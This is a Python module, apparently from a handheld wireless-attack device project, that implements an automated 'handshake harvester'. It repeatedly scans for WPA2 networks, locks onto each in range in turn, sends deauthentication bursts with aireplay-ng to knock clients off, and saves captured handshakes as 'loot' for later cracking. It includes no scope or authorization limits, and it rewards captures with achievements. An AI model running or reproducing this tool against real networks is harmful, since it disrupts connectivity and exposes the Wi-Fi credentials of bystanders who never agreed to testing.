"""Handshake Harvester — Automated multi-network handshake acquisition.

Cycles through WPA2 networks, locking on each to capture handshakes.
"""
from __future__ import annotations

import os
import re
import signal
import subprocess
import threading
import time
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path

import pygame

from bigbox import theme, hardware, achievements
from bigbox.events import Button, ButtonEvent
from bigbox.ui.section import SectionContext
from bigbox.ui.wifi_attack import AP, Client, read_airodump_csv, _list_wlan_ifaces

PHASE_PICK_IFACE = "iface"
PHASE_RUNNING = "running"
PHASE_STOPPED = "stopped"

@dataclass
class HarvestStats:
    targeted: int = 0
    captured: int = 0
    skipped: int = 0

class HarvesterView:
    LOOT_DIR = Path("loot/handshakes")

    def __init__(self) -> None:
        self.dismissed = False
        self.phase = PHASE_PICK_IFACE
        self.status_msg = "Select monitor adapter"
        
        self.ifaces = _list_wlan_ifaces()
        self.iface_cursor = 0
        self.mon_iface: str | None = None
        self.original_iface: str | None = None
        
        self.stats = HarvestStats()
        self.current_target: AP | None = None
        self.queue: list[AP] = []
        
        self._stop = False
        self._worker_thread: threading.Thread | None = None
        self._airodump: subprocess.Popen | None = None
        self._handshake_captured = False

    def handle(self, ev: ButtonEvent, ctx: SectionContext) -> None:
        if not ev.pressed: return
        
        if ev.button is Button.B:
            if self.phase == PHASE_RUNNING:
                self._stop_harvester()
                self.phase = PHASE_STOPPED
            else:
                self.dismissed = True
            return

        if self.phase == PHASE_PICK_IFACE:
            if not self.ifaces: return
            if ev.button is Button.UP: self.iface_cursor = (self.iface_cursor - 1) % len(self.ifaces)
            elif ev.button is Button.DOWN: self.iface_cursor = (self.iface_cursor + 1) % len(self.ifaces)
            elif ev.button is Button.A:
                pick = self.ifaces[self.iface_cursor]
                if not hardware.request_iface(pick.name):
                    self.status_msg = f"{pick.name} is busy"
                    return
                self.original_iface = pick.name
                self.mon_iface = hardware.enable_monitor(pick.name)
                if self.mon_iface:
                    self.phase = PHASE_RUNNING
                    self._start_harvester()
                else:
                    self.status_msg = "Monitor mode FAILED"
            return

    def _start_harvester(self):
        self._stop = False
        self._worker_thread = threading.Thread(target=self._automation_loop, daemon=True)
        self._worker_thread.start()

    def _stop_harvester(self):
        self._stop = True
        self._stop_airodump()
        if self.original_iface:
            hardware.release_iface(self.original_iface)

    def _stop_airodump(self):
        if self._airodump and self._airodump.poll() is None:
            try:
                os.killpg(os.getpgid(self._airodump.pid), signal.SIGINT)
                self._airodump.wait(timeout=2)
            except:
                try: self._airodump.kill()
                except: pass
        self._airodump = None

    def _automation_loop(self):
        while not self._stop:
            # 1. SCAN PHASE
            self.status_msg = "Scanning for targets..."
            self.current_target = None
            
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            prefix = self.LOOT_DIR / f"harvester_scan_{ts}"
            csv_path = Path(str(prefix) + "-01.csv")
            
            cmd = ["airodump-ng", "--output-format", "csv", "-w", str(prefix), self.mon_iface]
            self._airodump = subprocess.Popen(cmd, preexec_fn=os.setsid, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Scan for 15 seconds to find APs
            time.sleep(15)
            self._stop_airodump()
            
            aps, _ = read_airodump_csv(csv_path)
            # Filter for WPA2 and reasonable signal
            targets = [a for a in aps if "WPA2" in a.privacy and a.power > -85]
            targets.sort(key=lambda a: a.power, reverse=True)
            
            if not targets:
                self.status_msg = "No WPA2 targets found. Retrying..."
                time.sleep(5)
                continue
            
            # 2. TARGETING PHASE
            for ap in targets:
                if self._stop: break
                
                self.current_target = ap
                self.status_msg = f"Targeting: {ap.essid or ap.bssid}"
                self.stats.targeted += 1
                self._handshake_captured = False
                
                # Start targeted capture
                safe_ssid = re.sub(r"[^A-Za-z0-9]", "_", ap.essid or "hidden")[:15]
                prefix = self.LOOT_DIR / f"h_{safe_ssid}_{ts}"
                cmd = [
                    "airodump-ng", "-c", ap.channel, "--bssid", ap.bssid,
                    "--output-format", "pcap", "-w", str(prefix), self.mon_iface
                ]
                
                self._airodump = subprocess.Popen(cmd, preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                
                # Monitor for handshake
                def _checker():
                    for line in self._airodump.stdout:
                        if "WPA handshake" in line:
                            self._handshake_captured = True
                            break
                
                checker_t = threading.Thread(target=_checker, daemon=True)
                checker_t.start()
                
                # Wait 15s for natural handshake
                time.sleep(15)
                
                if not self._handshake_captured:
                    self.status_msg = f"Deauthing {ap.essid or ap.bssid}..."
                    # Send deauth burst
                    subprocess.run(["aireplay-ng", "--deauth", "5", "-a", ap.bssid, self.mon_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    # Wait another 15s
                    time.sleep(15)
                
                self._stop_airodump()
                
                if self._handshake_captured:
                    self.stats.captured += 1
                    achievements.report_handshake()
                    self.status_msg = "SUCCESS! Handshake saved."
                    time.sleep(3)
                else:
                    self.stats.skipped += 1
                    self.status_msg = "Target failed. Moving on..."
                    time.sleep(2)

    def render(self, surf: pygame.Surface) -> None:
        surf.fill(theme.BG)
        f_title = pygame.font.Font(None, 32)
        f_main = pygame.font.Font(None, 24)
        f_huge = pygame.font.Font(None, 64)
        
        surf.blit(f_title.render("HARVESTER :: HANDSHAKE AUTOPILOT", True, theme.ACCENT), (20, 20))
        
        if self.phase == PHASE_PICK_IFACE:
            surf.blit(f_main.render("SELECT MONITOR ADAPTER:", True, theme.FG_DIM), (20, 70))
            for i, iface in enumerate(self.ifaces):
                sel = (i == self.iface_cursor)
                color = theme.ACCENT if sel else theme.FG
                surf.blit(f_main.render(iface.name, True, color), (40, 100 + i * 30))
        
        elif self.phase == PHASE_RUNNING:
            # Stats row
            surf.blit(f_main.render("CAPTURED", True, theme.FG_DIM), (50, 100))
            surf.blit(f_huge.render(str(self.stats.captured), True, theme.ACCENT), (70, 130))
            
            surf.blit(f_main.render("TARGETED", True, theme.FG_DIM), (250, 100))
            surf.blit(f_huge.render(str(self.stats.targeted), True, theme.FG), (270, 130))

            surf.blit(f_main.render("SKIPPED", True, theme.FG_DIM), (450, 100))
            surf.blit(f_huge.render(str(self.stats.skipped), True, theme.ERR), (470, 130))
            
            # Current target info
            if self.current_target:
                pygame.draw.rect(surf, (20, 25, 35), (20, 250, theme.SCREEN_W - 40, 120), border_radius=10)
                pygame.draw.rect(surf, theme.ACCENT, (20, 250, theme.SCREEN_W - 40, 120), 1, border_radius=10)
                
                surf.blit(f_main.render("CURRENT_TARGET_ID", True, theme.ACCENT), (40, 265))
                surf.blit(f_title.render(self.current_target.essid or "<hidden>", True, theme.FG), (40, 290))
                surf.blit(f_main.render(f"BSSID: {self.current_target.bssid}  CH: {self.current_target.channel}", True, theme.FG_DIM), (40, 325))
                
                # Progress bar for handshake timer?
                # ...
            else:
                surf.blit(f_main.render("WAITING FOR TARGETS...", True, theme.FG_DIM), (theme.SCREEN_W // 2 - 100, 300))

        # Status
        pygame.draw.rect(surf, (10, 10, 20), (0, theme.SCREEN_H - 40, theme.SCREEN_W, 40))
        pygame.draw.line(surf, theme.DIVIDER, (0, theme.SCREEN_H - 40), (theme.SCREEN_W, theme.SCREEN_H - 40))
        surf.blit(f_main.render(self.status_msg, True, theme.ACCENT), (20, theme.SCREEN_H - 30))
